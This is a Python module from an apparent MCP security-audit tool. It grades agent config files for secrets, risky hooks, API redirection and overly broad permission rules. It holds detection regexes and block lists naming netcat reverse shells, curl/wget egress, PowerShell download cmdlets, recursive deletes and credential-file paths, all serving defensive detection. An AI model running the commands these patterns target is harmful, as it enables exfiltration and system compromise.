"""Grade MCP config files for filesystem security hygiene.

This analyzer checks the *file* itself — permissions, parent-directory
write-access, and inline vs. env-var secret storage — rather than the
parsed server contents (credentials.py handles that layer).

Motivation: on 2026-04-22 supply-chain malware embedded in the Bitwarden
npm package explicitly targeted ``~/.claude.json``, ``~/.claude/mcp.json``,
and ``~/.kiro/settings/mcp.json`` as its primary credential-cache targets.
mcp-audit's ``discover`` command already knows exactly where all 8 supported
clients store their configs; this analyzer grades each file's exposure.

**Hook analysis (HOOK-001, HOOK-002)** was added as part of the agent-file
scanner (2026-06-14).  Claude Code executes hook commands at lifecycle events
(``preToolUse``, ``postToolUse``, ``stop``, etc.); these checks fire on the
`hooks` section of *any* claude-client config file, not just the user-global
``.claude.json``.

**Other harnesses' auto-run files (TRUST-008) and settings that redirect API
traffic (CFHYG-007)** were added in STORY-0090 (2026-10-25); key semantics
come from the Gemini CLI, Codex and Claude Code docs, cited where each check
is defined.

**Harness posture (HARNESS-001..004)** was added in STORY-0079 (2026-10-11):
Claude Code settings that switch human approval off.  Basis: HarnessSecurity-Bench
(arXiv 2610.07639) measured attack success on coding agents rising from 29.2% to
95.6% with auto-approve on, and found about half of their security mechanisms
opt-in.  Keys and semantics follow code.claude.com/docs/en/permissions.

**Permission rules that don't do what they say (PERM-001..007)** were added in
STORY-0092 (2026-10-25) and live in :mod:`mcp_audit.analyzers.permissions`:
``analyze_config`` runs PERM-001..006 on the same files as HARNESS-*, and the
scanner runs PERM-007 after every per-server analyzer.

**Sandbox settings a repository can loosen (SANDBOX-001..005)** were added in
STORY-0093 (2026-10-26) and live in :mod:`mcp_audit.analyzers.sandbox`.  They
are not run from ``analyze_config``: whether a local settings file is the
repository's depends on git's ignore files and their severity on the user's
own settings, so the scanner runs all five as pipeline step 0b, on the same
files, gated on this analyzer.
"""

from __future__ import annotations

import ipaddress
import json
import logging
import os
import re
import stat as stat_module
import tomllib
from pathlib import Path
from typing import NamedTuple
from urllib.parse import unquote, urlsplit

from mcp_audit.agent_files.subagents import (
    AgentFrontmatter,
    analyze_agent_definition,
    finalize_findings,
)
from mcp_audit.analyzers import permissions as _permissions
from mcp_audit.analyzers.base import BaseAnalyzer
from mcp_audit.analyzers.credentials import SECRET_PATTERNS, CredentialsAnalyzer
from mcp_audit.analyzers.hook_scripts import find_project_script
from mcp_audit.analyzers.poisoning import normalize_for_detection
from mcp_audit.analyzers.supply_chain import redact_command_text
from mcp_audit.discovery import AGENT_DEFINITION_CLIENT, agent_definition_scope
from mcp_audit.discovery import (
    SIBLING_HARNESS_AUTOEXEC_KINDS as _SIBLING_HARNESS_CHECKS,
)
from mcp_audit.models import Finding, ServerConfig, Severity

logger = logging.getLogger(__name__)

# ── Hook-command analysis patterns ────────────────────────────────────────────

# HOOK-001: network egress commands/URLs inside hook command strings.
# Matches curl, wget, nc/ncat (netcat), socat, Python network one-liners,
# PowerShell Invoke-WebRequest / Invoke-RestMethod (and their iwr/irm aliases),
# and raw http(s):// URLs.
#
# The ``nc`` clause matches any netcat invocation that carries an argument
# (``\bnc\s+\S``).  An earlier ``(?!-[a-z])`` look-ahead was removed because it
# silently excluded the most dangerous form — the ``nc -e /bin/sh <host> <port>``
# reverse shell — while still matching benign-looking host-form invocations.
# In an agent lifecycle hook there is no legitimate use of netcat, so matching
# every ``nc <arg>`` form closes that false-negative without adding noise.
#
# The Python clause uses ``python[0-9.]*`` (not a bare ``python``) so that the
# canonical interpreter names ``python3`` and ``python3.11`` — which an attacker
# is overwhelmingly more likely to write than bare ``python`` — are matched.  A
# bare ``\bpython\b`` silently excluded every ``python3`` reverse shell / exfil
# one-liner (the same false-negative class as the historic ``nc -e`` miss).  The
# network-module list covers HTTP egress (urllib/requests/httpx/http.client),
# socket-level reverse shells (socket/socketserver), mail/ftp exfil
# (smtplib/ftplib), and the ``http.server`` egress listener.
#
# PowerShell aliases ``iwr`` (Invoke-WebRequest) and ``irm`` (Invoke-RestMethod)
# are matched alongside the full cmdlet names — a hook author can invoke either
# spelling and the alias form carries no http(s):// token to fall back on.
_HOOK_NETWORK_RE: re.Pattern[str] = re.compile(
    r"(?i)\b(curl|wget|ncat|socat|iwr|irm|Invoke-WebRequest|Invoke-RestMethod)\b"
    r"|https?://[^\s\)\"\']{8,}"
    r"|\bpython[0-9.]*\b.{0,80}"
    r"\b(urllib|requests|httpx|http\.client|http\.server|"
    r"socketserver|socket|smtplib|ftplib)\b"
    r"|\bnc\s+\S",
    re.IGNORECASE,
)

# HOOK-002: hook command writes to / references agent config file paths.
# Covers the most common MCP config file locations across all 8 supported clients.
# This path-string approach is robust to *write-method* variation (tee, dd,
# sed -i, python -c "open(...)" all fire as long as the literal path appears).
# EVASION-KNOWN: a path assembled at runtime (os.path.join, shell variable
# expansion, base64-encoded path) is not matched — see GAPS.md "Known detection
# evasions". Closing it needs shell/Python parsing beyond this regex's intent.
_HOOK_CONFIG_WRITE_RE: re.Pattern[str] = re.compile(
    r"(?i)"
    r"\.claude\.json|claude_desktop_config\.json"
    r"|\.cursor[/\\]mcp\.json|\.cursor[/\\]settings\.json"
    r"|\.kiro[/\\]settings[/\\]mcp\.json"
    r"|\.vscode[/\\]mcp\.json"
    r"|\.augment[/\\]settings\.json"
    r"|\.codeium[/\\]windsurf[/\\]mcp[/_]server_config\.json"
    r"|Library[/\\]Application Support[/\\](Claude|claude)"
    r"|AppData[/\\]Roaming[/\\](Claude|claude)"
    # TRUST-003 anchor incident (Keyv npm worm, Shai-Hulud "V.A.P.E"): both
    # worms rewrote these three files as their persistence channel, not just
    # the ones above.
    r"|\.claude[/\\]settings\.json"
    r"|\.claude[/\\]settings\.local\.json"
    r"|\.vscode[/\\]tasks\.json"
)

# ── TRUST-003: repo-planted IDE auto-execution files ──────────────────────────

# VS Code settings keys that carry a command, interpreter, or shell path.
# A repo-committed .vscode/settings.json can override these at workspace
# scope, redirecting the developer's terminal/interpreter to an
# attacker-controlled binary the moment the folder is opened and a terminal
# or language feature is used.  Extend this list only when VS Code's own
# docs confirm a new command-bearing key (note the addition in the PR body).
_SETTINGS_COMMAND_KEY_PREFIXES: tuple[str, ...] = (
    "terminal.integrated.env.",
    "terminal.integrated.profiles.",
    "terminal.integrated.shellArgs.",
)
_SETTINGS_COMMAND_KEY_SUFFIXES: tuple[str, ...] = (
    ".serverPath",
    ".interpreterPath",
    ".pythonPath",
    ".nodePath",
)

# A VS Code settings/task string value that starts with one of these
# variable references is resolved relative to the workspace and is never
# treated as "outside the project root", regardless of what follows.
_VSCODE_VAR_PREFIX_RE: re.Pattern[str] = re.compile(r"^\$\{")

_URL_RE: re.Pattern[str] = re.compile(r"(?i)\b[a-z][a-z0-9+.\-]*://")

_WINDOWS_ABS_RE: re.Pattern[str] = re.compile(r"^([A-Za-z]:[\\/]|\\\\)")


def _is_command_bearing_settings_key(key: str) -> bool:
    """Return True when *key* (a dotted VS Code settings path) can launch a command."""
    if any(key.startswith(prefix) for prefix in _SETTINGS_COMMAND_KEY_PREFIXES):
        return True
    return any(key.endswith(suffix) for suffix in _SETTINGS_COMMAND_KEY_SUFFIXES)


def _is_absolute_outside_root(value: str, project_root: Path) -> bool:
    """Return True when *value* is an absolute path resolving outside *project_root*.

    A VS Code variable reference (``${workspaceFolder}``, ``${env:HOME}``, …)
    is always treated as in-project, since it is resolved relative to the
    workspace at runtime, not read as a literal filesystem path here.
    """
    stripped = value.strip()
    if _VSCODE_VAR_PREFIX_RE.match(stripped):
        return False
    is_abs_posix = stripped.startswith("/")
    is_abs_windows = bool(_WINDOWS_ABS_RE.match(stripped))
    if not (is_abs_posix or is_abs_windows):
        return False
    try:
        Path(stripped).resolve().relative_to(project_root.resolve())
    except (ValueError, OSError):
        return True
    return False


def _strip_jsonc_comments(text: str) -> str:
    """Strip ``//`` and ``/* */`` comments from JSONC text, string-aware.

    VS Code accepts JSONC (JSON with Comments and trailing commas) for both
    ``tasks.json`` and ``settings.json``.  A naive regex would corrupt a
    string value that legitimately contains ``//`` (e.g. a URL), so this
    walks the text character-by-character and only strips comment tokens
    that appear *outside* a string literal.
    """
    out: list[str] = []
    i = 0
    n = len(text)
    in_string = False
    escape = False
    while i < n:
        ch = text[i]
        if in_string:
            out.append(ch)
            if escape:
                escape = False
            elif ch == "\\":
                escape = True
            elif ch == '"':
                in_string = False
            i += 1
            continue
        if ch == '"':
            in_string = True
            out.append(ch)
            i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "/":
            while i < n and text[i] not in ("\n", "\r"):
                i += 1
            continue
        if ch == "/" and i + 1 < n and text[i + 1] == "*":
            i += 2
            while i + 1 < n and not (text[i] == "*" and text[i + 1] == "/"):
                i += 1
            i += 2
            continue
        out.append(ch)
        i += 1
    return "".join(out)


def _strip_trailing_commas(text: str) -> str:
    """Remove trailing commas before a closing ``}``/``]`` (JSONC, not strict JSON)."""
    return re.sub(r",(\s*[}\]])", r"\1", text)


_SETTINGS_FLATTEN_MAX_DEPTH = 10


def _flatten_settings_keys(
    raw: dict, prefix: str = "", depth: int = 0
) -> list[tuple[str, object]]:
    """Flatten a (possibly nested) settings dict into dotted ``(key, value)`` pairs.

    VS Code settings are usually already flat (``"terminal.integrated.env.osx"``
    is itself a literal JSON key), but a command-bearing prefix such as
    ``terminal.integrated.profiles.`` is one level deeper in practice
    (``profiles.osx.my-shell.path``), so nested objects are walked too.
    Depth-capped to guard against a pathologically nested config.
    """
    if depth > _SETTINGS_FLATTEN_MAX_DEPTH or not isinstance(raw, dict):
        return []
    pairs: list[tuple[str, object]] = []
    for key, value in raw.items():
        full_key = f"{prefix}.{key}" if prefix else str(key)
        if isinstance(value, dict):
            pairs.extend(_flatten_settings_keys(value, full_key, depth + 1))
        else:
            pairs.append((full_key, value))
    return pairs


def parse_jsonc(text: str) -> dict | list | None:
    """Best-effort JSONC parse for ``tasks.json`` / ``settings.json``.

    Returns ``None`` on any failure instead of raising — callers must treat
    a parse failure as a WARN, never a crash, and never a silent skip (the
    caller is responsible for logging).
    """
    try:
        return json.loads(_strip_trailing_commas(_strip_jsonc_comments(text)))
    except (json.JSONDecodeError, RecursionError):
        return None


# ── TRUST-008: other harnesses' auto-run files (STORY-0090) ───────────────────

#: Largest TRUST-008 file that is read.  A bigger one is reported unread
#: (MEDIUM) instead of skipped, so padding a file cannot hide what it holds.
_AUTOEXEC_MAX_BYTES = 2 * 1024 * 1024
#: Names an inventory-style evidence string lists before "(+N more)".
_INVENTORY_LIST_CAP = 20
#: Hook or notify commands a TRUST-008 evidence string quotes.
_EVIDENCE_COMMAND_CAP = 3

_DOTENV_LINE_RE = re.compile(r"^\s*(?:export\s+)?([A-Za-z_][A-Za-z0-9_.]*)\s*=\s*(.*)$")


def _parse_dotenv(text: str) -> dict[str, str]:
    """Parse ``KEY=value`` lines of a ``.env`` file; never raises.

    Comments, blank lines and lines that are not assignments are skipped.
    Matching single or double quotes around a value are removed, and an
    unquoted value loses a trailing `` # comment``.
    """
    env: dict[str, str] = {}
    for line in text.splitlines():
        stripped = line.strip()
        if not stripped or stripped.startswith("#"):
            continue
        match = _DOTENV_LINE_RE.match(line)
        if match is None:
            continue
        key, value = match.group(1), match.group(2).strip()
        if len(value) >= 2 and value[0] == value[-1] and value[0] in "'\"":
            value = value[1:-1]
        elif " #" in value:
            value = value.split(" #", 1)[0].rstrip()
        env[key] = value
    return env


def _short_path(path: Path) -> str:
    """``.gemini/settings.json``-style name: the parent directory plus the name."""
    return f"{path.parent.name}/{path.name}" if path.parent.name else path.name


def _mask_secrets(text: str) -> str:
    """Replace every :data:`SECRET_PATTERNS` match in *text* with ``***``."""
    for _name, pattern, _provider in SECRET_PATTERNS:
        text = pattern.sub("***", text)
    return text


def _capped_list(names: list[str]) -> str:
    """Join *names*, listing at most :data:`_INVENTORY_LIST_CAP` of them."""
    shown = ", ".join(names[:_INVENTORY_LIST_CAP])
    if len(names) > _INVENTORY_LIST_CAP:
        shown += f" (+{len(names) - _INVENTORY_LIST_CAP} more)"
    return shown


def _quote_commands(commands: list[str]) -> str:
    """Quote up to :data:`_EVIDENCE_COMMAND_CAP` commands, secrets masked."""
    quoted = "; ".join(
        repr(_mask_secrets(cmd)[:120]) for cmd in commands[:_EVIDENCE_COMMAND_CAP]
    )
    if len(commands) > _EVIDENCE_COMMAND_CAP:
        quoted += f" (+{len(commands) - _EVIDENCE_COMMAND_CAP} more)"
    return quoted


#: ``${cmd: ...}``: MCPHub's run-a-command placeholder.  The body stops at the
#: first ``}`` (linear: one negated class), which is enough to name the command.
_MCPHUB_CMD_RE: re.Pattern[str] = re.compile(r"\$\{cmd:([^}]*)")

#: Most commands collected from one file, and the deepest nesting walked.
_MCPHUB_MAX_COMMANDS = 200
_MCPHUB_MAX_DEPTH = 64


def _mcphub_commands(doc: dict | list) -> list[str]:
    """Commands in MCPHub ``${cmd: ...}`` / legacy ``$: ...`` placeholders.

    Walks the parsed document iteratively (no recursion, depth-bounded) and
    returns the placeholder bodies in document order.  Pure text work.
    """
    found: list[str] = []
    stack: list[tuple[object, str, int]] = [(doc, "", 0)]
    while stack and len(found) < _MCPHUB_MAX_COMMANDS:
        node, parent_key, depth = stack.pop()
        if depth > _MCPHUB_MAX_DEPTH:
            continue
        if isinstance(node, str):
            for match in _MCPHUB_CMD_RE.finditer(node):
                found.append(match.group(1).strip())
            if parent_key == "env" and node.startswith("$:"):
                found.append(node[2:].strip())
        elif isinstance(node, dict):
            items = list(node.items())
            for key, value in reversed(items):
                if parent_key == "env" and isinstance(value, str):
                    stack.append((value, "env", depth + 1))
                else:
                    stack.append((value, str(key), depth + 1))
        elif isinstance(node, list):
            for value in reversed(node):
                stack.append((value, parent_key, depth + 1))
    return found[:_MCPHUB_MAX_COMMANDS]


def _network_primitive(commands: list[str]) -> str | None:
    """Return the first network-egress primitive in *commands* (HOOK-001's regex)."""
    for cmd in commands:
        match = _HOOK_NETWORK_RE.search(normalize_for_detection(cmd))
        if match:
            return match.group(0)
    return None


# ── Env-var reference patterns ────────────────────────────────────────────────

# Env-var reference patterns: ${VAR}, $VAR, %(VAR)s, %VAR%
_ENV_REF_PATTERNS: list[re.Pattern[str]] = [
    re.compile(r"\$\{[A-Za-z_][A-Za-z0-9_]*\}"),  # ${VAR}
    re.compile(r"\$[A-Za-z_][A-Za-z0-9_]+"),  # $VAR (2+ chars after $)
    re.compile(r"%\([A-Za-z_][A-Za-z0-9_]*\)s"),  # %(VAR)s
    re.compile(r"%[A-Za-z_][A-Za-z0-9_]*%"),  # %VAR% (Windows style)
]


def _looks_like_env_ref(value: str) -> bool:
    """Return True when *value* is an env-var reference, not a literal secret."""
    return any(pat.search(value) for pat in _ENV_REF_PATTERNS)


# ── First-party API endpoints (CFHYG-006, CFHYG-007, TRUST-008) ──────────────

#: The Anthropic API origin CFHYG-006 treats as first-party.  CFHYG-007 reuses
#: it, so the two checks cannot drift apart.
_ANTHROPIC_API_ORIGIN = "https://api.anthropic.com"
_ANTHROPIC_API_HOST = urlsplit(_ANTHROPIC_API_ORIGIN).hostname or ""


def _is_first_party_anthropic_base_url(value: str) -> bool:
    """CFHYG-006's first-party test: an env-var reference or the Anthropic origin.

    This is a prefix test and is kept exactly as CFHYG-006 has always applied
    it.  CFHYG-007 calls it too and then also requires the parsed host to be
    exactly ``api.anthropic.com`` (:func:`_redirect_host`), so a value such as
    ``https://api.anthropic.com.example.net`` passes here but not there.
    """
    return _looks_like_env_ref(value) or value.startswith(_ANTHROPIC_API_ORIGIN)


# Environment variables that choose where an AI API client sends its requests
# (and so its API key), each with the hosts its vendor documents as its own.
# ``None`` means no first-party host exists: any remote host is a redirect.
# Sources: code.claude.com/docs/en/env-vars (the ANTHROPIC_* endpoints,
# HTTP_PROXY, HTTPS_PROXY), the Bedrock / Agent Platform / Foundry / Claude
# Platform on AWS pages for their default hosts, geminicli.com configuration
# reference (GOOGLE_GEMINI_BASE_URL, GOOGLE_VERTEX_BASE_URL) and the
# openai-python README (OPENAI_BASE_URL).  A settings ``env`` block reaches
# every subprocess Claude Code starts, so a redirect of another vendor's
# client is in scope too.  ALL_PROXY and lowercase proxy names are not
# documented by Claude Code and are left out (GAPS.md).
_VERTEX_HOST_RE = re.compile(
    r"^(?:[a-z0-9-]+-)?aiplatform\.googleapis\.com$"
    r"|^aiplatform\.[a-z0-9-]+\.rep\.googleapis\.com$"
)
# An AWS region name as it appears in a service endpoint host: two letters,
# one or more words, a number (``us-east-1``, ``us-gov-west-1``, ``ap-southeast-4``).
_AWS_REGION = r"[a-z]{2}(?:-[a-z]+)+-\d+"
_REDIRECT_ENV_FIRST_PARTY: dict[str, re.Pattern[str] | None] = {
    "ANTHROPIC_BASE_URL": re.compile(rf"^{re.escape(_ANTHROPIC_API_HOST)}$"),
    # bedrock-runtime(-fips).<region>.amazonaws.com and interface VPC endpoints
    # vpce-<id>.bedrock-runtime.<region>.vpce.amazonaws.com (AWS Bedrock user
    # guide, "Use interface VPC endpoints").  The middle label must be a region
    # (``us-east-1``, ``us-gov-west-1``): a looser label would accept S3
    # virtual-hosted bucket hosts such as ``bedrock-runtime-fips.s3.amazonaws.com``,
    # which anyone can claim by creating that bucket.
    "ANTHROPIC_BEDROCK_BASE_URL": re.compile(
        rf"^bedrock-runtime(?:-fips)?\.{_AWS_REGION}\.amazonaws\.com$"
        rf"|^vpce-[a-z0-9-]+\.bedrock-runtime(?:-fips)?\.{_AWS_REGION}"
        r"\.vpce\.amazonaws\.com$"
    ),
    "ANTHROPIC_BEDROCK_MANTLE_BASE_URL": None,
    "ANTHROPIC_VERTEX_BASE_URL": _VERTEX_HOST_RE,
    "ANTHROPIC_FOUNDRY_BASE_URL": re.compile(r"^[a-z0-9-]+\.services\.ai\.azure\.com$"),
    "ANTHROPIC_AWS_BASE_URL": re.compile(
        rf"^aws-external-anthropic\.{_AWS_REGION}\.api\.aws$"
    ),
    "OPENAI_BASE_URL": re.compile(r"^api\.openai\.com$"),
    "GOOGLE_GEMINI_BASE_URL": re.compile(r"^generativelanguage\.googleapis\.com$"),
    "GOOGLE_VERTEX_BASE_URL": _VERTEX_HOST_RE,
    "HTTP_PROXY": None,
    "HTTPS_PROXY": None,
}
# Any other ANTHROPIC_*BASE_URL name is treated as an endpoint override with
# no known first-party host (Claude Code adds these per provider).
_ANTHROPIC_BASE_URL_NAME_RE = re.compile(r"^ANTHROPIC_[A-Z0-9_]*BASE_URL$")
# A host that is wholly an env-var reference (``${HOST}``, ``$HOST``,
# ``%HOST%``) is not a literal destination: Claude Code does not expand
# references in ``env``, so such a value names no host at all.
_TEMPLATE_HOST_RE = re.compile(
    r"^(?:\$\{[^}]*\}|\$[a-z_][a-z0-9_]*|%[a-z0-9_]+%)$", re.IGNORECASE
)
_URL_SCHEME_RE = re.compile(r"^([A-Za-z][A-Za-z0-9+.\-]*):(.*)$", re.DOTALL)
# WHATWG "special" schemes: a backslash is a path separator and any run of
# slashes before the authority is skipped.  Node (Claude Code, Gemini CLI)
# parses URLs this way; Python's urlsplit does not.
_SPECIAL_SCHEMES = frozenset({"http", "https", "ws", "wss", "ftp"})
_C0_OR_SPACE = "".join(chr(c) for c in range(0x21))


class _Endpoint(NamedTuple):
    """Where a URL-valued variable sends traffic, as one parser reads it."""

    scheme: str  # lower case; "" for a bare ``host:port`` proxy value
    host: str  # lower case, percent-decoded, IPv6 without brackets; "" if none
    userinfo: bool  # a user name or password before "@" in the authority
    canonical: str  # scheme://host[:port]/path with scheme and host lower-cased


def _parse_endpoint(text: str, *, whatwg: bool) -> _Endpoint:
    """Read the authority of *text*; never raises.

    With *whatwg*, backslashes before the query are path separators for the
    special schemes and for a bare ``host:port`` value (which proxy clients
    read as ``http://``), as Node's URL parser treats them.  Without it, the
    text is taken literally, as Python's urlsplit would.  The caller checks
    both readings and reports a value if either one leaves first-party hosts.
    """
    match = _URL_SCHEME_RE.match(text)
    scheme, rest = "", text
    if match and (
        match.group(1).lower() in _SPECIAL_SCHEMES or match.group(2).startswith("//")
    ):
        scheme, rest = match.group(1).lower(), match.group(2)
    if scheme in _SPECIAL_SCHEMES or not scheme:
        if whatwg:
            cut = min(
                (i for i in (rest.find("?"), rest.find("#")) if i >= 0),
                default=len(rest),
            )
            rest = rest[:cut].replace("\\", "/") + rest[cut:]
            rest = rest.lstrip("/")
        elif rest.startswith("//"):
            rest = rest[2:]
    else:
        rest = rest[2:]
    authority = re.split(r"[/?#]", rest, maxsplit=1)[0]
    hostport = authority.rpartition("@")[2]
    if hostport.startswith("["):
        host = hostport[1:].split("]", 1)[0]
    else:
        host = hostport.split(":", 1)[0]
    host = unquote(host).lower()
    canonical = (
        f"{scheme or 'http'}://{unquote(hostport).lower()}{rest[len(authority) :]}"
    )
    return _Endpoint(scheme, host, "@" in authority, canonical)


def _is_loopback_literal(host: str) -> bool:
    """True for ``localhost``, ``*.localhost`` or a loopback IP literal.

    This classifies text in a config file; it does not guard a connection.
    Any other hostname is *not* exempted and gets reported, so a name that
    happens to resolve to 127.0.0.1 is still a finding: fail-closed.
    """
    if host == "localhost" or host.endswith(".localhost"):
        return True
    try:
        ip = ipaddress.ip_address(host)  # nosemgrep: mcp-ssrf-ip-literal-only-guard
    except ValueError:
        return False
    return ip.is_loopback


def _endpoint_is_first_party(
    name: str, endpoint: _Endpoint, first_party: re.Pattern[str] | None
) -> bool:
    """True when *endpoint* (one parser's reading) stays on first-party hosts."""
    if endpoint.userinfo or not endpoint.host:
        return False
    host = endpoint.host.rstrip(".")
    if _is_loopback_literal(host):
        return True
    if name == "ANTHROPIC_BASE_URL":
        # CFHYG-006's own test, on the lower-cased URL, then an exact host.
        return (
            _is_first_party_anthropic_base_url(endpoint.canonical)
            and host == _ANTHROPIC_API_HOST
        )
    return first_party is not None and bool(first_party.match(host))


def _redirect_host(name: str, value: object) -> str | None:
    """Return a label for where *value* redirects traffic, else ``None``.

    *name* is an environment variable name.  ``None`` is returned when the
    variable does not choose an API endpoint or proxy, when the value is
    empty (Claude Code treats ``""`` as unset) or wholly an env-var
    reference, and when every reading of the URL stays on the vendor's own
    host or on loopback.  Anything else is reported, fail-closed: a host the
    two URL parsers disagree on, user info before ``@`` (which can disguise
    the real host), or a value with no parsable host.  The label is the host
    Node would connect to; it never carries the URL's userinfo, path or
    query, so a proxy password is never echoed.
    """
    if name in _REDIRECT_ENV_FIRST_PARTY:
        first_party = _REDIRECT_ENV_FIRST_PARTY[name]
    elif _ANTHROPIC_BASE_URL_NAME_RE.match(name):
        first_party = None
    else:
        return None
    if not isinstance(value, str):
        return None
    text = re.sub(r"[\t\n\r]", "", value.strip(_C0_OR_SPACE))
    if not text:
        return None
    node = _parse_endpoint(text, whatwg=True)
    literal = _parse_endpoint(text, whatwg=False)
    if _TEMPLATE_HOST_RE.match(node.host) and not (node.userinfo or literal.userinfo):
        return None
    if _endpoint_is_first_party(name, node, first_party) and _endpoint_is_first_party(
        name, literal, first_party
    ):
        return None
    label = node.host or "(no parsable host)"
    if node.userinfo or literal.userinfo:
        label += " (user info before '@')"
    elif literal.host != node.host:
        label += f" (read literally: {literal.host or 'no host'})"
    return label


def _redirecting_env_vars(env: dict) -> list[tuple[str, str]]:
    """``(name, host)`` for each variable in *env* that redirects API traffic."""
    found: list[tuple[str, str]] = []
    for name, value in env.items():
        if not isinstance(name, str):
            continue
        host = _redirect_host(name, value)
        if host is not None:
            found.append((name, host))
    return found


# An Azure resource name as ANTHROPIC_FOUNDRY_RESOURCE takes it: Claude Code
# "refuses a URL or host name" there (code.claude.com/docs/en/env-vars).
_FOUNDRY_RESOURCE_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9-]{0,63}$")
_FOUNDRY_HOST_SUFFIX = ".services.ai.azure.com"


def _foundry_resources(env: dict) -> list[tuple[str, str]]:
    """``(variable, resource)`` for each Azure Foundry resource *env* selects.

    CFHYG-008 (STORY-0108).  ``ANTHROPIC_FOUNDRY_BASE_URL`` counts only when
    CFHYG-007 stays silent on it, i.e. every reading of the URL is on a
    ``<resource>.services.ai.azure.com`` host; the resource is that host's
    first label.  ``ANTHROPIC_FOUNDRY_RESOURCE`` counts when it is a plain
    resource name (Claude Code refuses anything else).  Empty values and
    env-var references name no resource.
    """
    found: list[tuple[str, str]] = []
    url = env.get("ANTHROPIC_FOUNDRY_BASE_URL")
    if (
        isinstance(url, str)
        and _redirect_host("ANTHROPIC_FOUNDRY_BASE_URL", url) is None
    ):
        text = re.sub(r"[\t\n\r]", "", url.strip(_C0_OR_SPACE))
        host = _parse_endpoint(text, whatwg=True).host.rstrip(".") if text else ""
        if host.endswith(_FOUNDRY_HOST_SUFFIX):
            found.append(
                ("ANTHROPIC_FOUNDRY_BASE_URL", host[: -len(_FOUNDRY_HOST_SUFFIX)])
            )
    name = env.get("ANTHROPIC_FOUNDRY_RESOURCE")
    if isinstance(name, str):
        name = name.strip()
        if _FOUNDRY_RESOURCE_NAME_RE.match(name) and not _looks_like_env_ref(name):
            found.append(("ANTHROPIC_FOUNDRY_RESOURCE", name.lower()))
    return found


# ── HARNESS-005/006 helpers (STORY-0087) ─────────────────────────────────────

# First words of shell commands whose arguments alone can write files, run code
# or reach the network.  A bare rule for one of these (``Bash(gh:*)``,
# ``Bash(curl *)``) approves all of that.  Sources: brief 2026-10-12 §2.3 (a bare
# ``gh`` allow entry let an agent post on another org's repo, Cursor forum 173328;
# HN 49918997 on allow rules wider than they read).
_BROAD_COMMANDS: frozenset[str] = frozenset(
    {
        # interpreters and shells
        "python",
        "python3",
        "node",
        "deno",
        "bun",
        "ruby",
        "perl",
        "php",
        "bash",
        "sh",
        "zsh",
        "pwsh",
        "powershell",
        # network tools
        "curl",
        "wget",
        "nc",
        "ncat",
        "ssh",
        "scp",
        "rsync",
        # CLIs with broad API reach
        "gh",
        "aws",
        "gcloud",
        "az",
        "kubectl",
        "docker",
        "terraform",
        # package runners and managers
        "npx",
        "uvx",
        "pipx",
        "bunx",
        "npm",
        "pnpm",
        "yarn",
        "pip",
        "pip3",
        # file and process power tools
        "rm",
        "find",
        "xargs",
        "env",
        "sudo",
        "git",
        "cat",
        # PowerShell cmdlets (and their aliases) that run a string as code,
        # start any program, or reach the network.  PowerShell rules "use the
        # same shape as Bash rules" and "Common aliases are canonicalized before
        # matching" (code.claude.com/docs/en/permissions); STORY-0092.
        "invoke-expression",
        "iex",
        "invoke-command",
        "icm",
        "start-process",
        "saps",
        "invoke-webrequest",
        "iwr",
        "invoke-restmethod",
        "irm",
    }
)
# Two-word commands that are broad on their own even when narrowed.
_BROAD_SUBCOMMANDS: frozenset[tuple[str, str]] = frozenset(
    {("git", "push"), ("npm", "publish"), ("gh", "api")}
)
# Environment runners: the subcommand runs whatever follows it as a command, so
# a rule that ends right after it approves everything (STORY-0092).
# code.claude.com/docs/en/permissions, "Wrappers": "Development environment
# runners such as `direnv exec`, `devbox run`, `mise exec`, `npx`, and `docker
# exec` are not in the list. Because these tools execute their arguments as a
# command, a rule like `Bash(devbox run *)` matches whatever comes after `run`,
# including `devbox run rm -rf .`."  Unlike _BROAD_SUBCOMMANDS, a rule narrowed
# to one inner command (`Bash(devbox run npm test)`, the doc's own fix) is not
# broad unless that inner command is.
_RUNNER_SUBCOMMANDS: frozenset[tuple[str, str]] = frozenset(
    {
        ("devbox", "run"),
        ("mise", "exec"),
        ("mise", "x"),
        ("direnv", "exec"),
        ("docker", "exec"),
        ("docker", "run"),
        ("podman", "exec"),
        ("podman", "run"),
        ("kubectl", "exec"),
        ("nix", "run"),
        ("npm", "exec"),
        ("pnpm", "dlx"),
        ("pnpm", "exec"),
        ("yarn", "dlx"),
        ("yarn", "exec"),
        ("bun", "x"),
        ("pipx", "run"),
        ("uv", "run"),
        ("poetry", "run"),
        ("pdm", "run"),
    }
)
# Runners whose first argument is a container, image, pod or directory, not
# the command (`docker exec <container> <cmd>`, `direnv exec <dir> <cmd>`).
_RUNNERS_WITH_TARGET: frozenset[tuple[str, str]] = frozenset(
    {
        ("docker", "exec"),
        ("docker", "run"),
        ("podman", "exec"),
        ("podman", "run"),
        ("kubectl", "exec"),
        ("direnv", "exec"),
    }
)
_RULE_RE = re.compile(r"^(Bash|PowerShell)\((.+)\)$")
_RECURSIVE_DELETE_RE = re.compile(
    r"\brm\s+-[a-z]*r|\bRemove-Item\b.*-Recurse|\brd\s+/s|\brmdir\s+/s",
    re.IGNORECASE,
)


def _is_broad_allow_rule(rule: object) -> bool:
    """True for ``Bash(<cmd>:*)``-style rules on a command in ``_BROAD_COMMANDS``.

    ``Bash``/``Bash(*)`` alone is HARNESS-004's and is not repeated here.  A rule
    narrowed to a subcommand (``Bash(gh pr view:*)``) is not broad, except for
    the subcommands in ``_BROAD_SUBCOMMANDS``.
    """
    if not isinstance(rule, str):
        return False
    m = _RULE_RE.match(rule.strip())
    if m is None:
        return False
    inner = m.group(2).strip()
    wildcard = False
    for suffix in (":*", " *", "*"):
        if inner.endswith(suffix):
            inner = inner[: -len(suffix)].strip()
            wildcard = True
            break
    words = inner.split()
    if not words:
        return False
    first = words[0].rsplit("/", 1)[-1].lower()
    if len(words) == 1:
        return first in _BROAD_COMMANDS
    if (first, words[1].lower()) in _BROAD_SUBCOMMANDS:
        return True
    return wildcard and _runner_runs_anything(first, words[1:])


def _runner_runs_anything(program: str, rest: list[str]) -> bool:
    """True when a wildcard rule ``<program> <rest…> *`` leaves a runner open.

    *rest* starts with the runner's subcommand.  After it come options, then
    (for :data:`_RUNNERS_WITH_TARGET`) a container, image, pod or directory,
    then the command; ``--`` starts the command explicitly.  The rule is broad
    when no command follows, or when the command is itself broad.
    """
    pair = (program, rest[0].lower())
    if pair not in _RUNNER_SUBCOMMANDS:
        return False
    after = rest[1:]
    if "--" in after:
        tail = after[after.index("--") + 1 :]
    else:
